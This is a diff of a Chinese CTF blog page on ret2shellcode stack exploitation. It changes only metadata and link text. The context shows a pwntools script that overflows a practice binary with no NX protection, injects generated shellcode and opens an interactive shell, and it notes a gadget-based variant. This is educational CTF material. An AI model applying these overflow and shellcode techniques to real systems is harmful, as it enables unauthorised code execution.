@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png">
 <meta property="article:published_time" content="2024-07-18T08:06:06.000Z">
-<meta property="article:modified_time" content="2024-07-18T16:00:14.414Z">
+<meta property="article:modified_time" content="2024-07-20T02:07:28.240Z">
 <meta property="article:author" content="TKYmax">
 <meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary_large_image">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          471 字
+          466 字
         
       </span>
     
@@ -312,7 +312,7 @@
 <li>在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li>
 <li>通过Metasploit生成</li>
 </ol>
-<h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png" srcset="/img/loading.gif" lazyload><br>查看保护没有开NX，可以用Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png" srcset="/img/loading.gif" lazyload><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p>
+<h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png" srcset="/img/loading.gif" lazyload><br>查看保护没有开NX，可以用Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png" srcset="/img/loading.gif" lazyload><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 <p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p>
 <h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png" srcset="/img/loading.gif" lazyload><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png" srcset="/img/loading.gif" lazyload><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p>
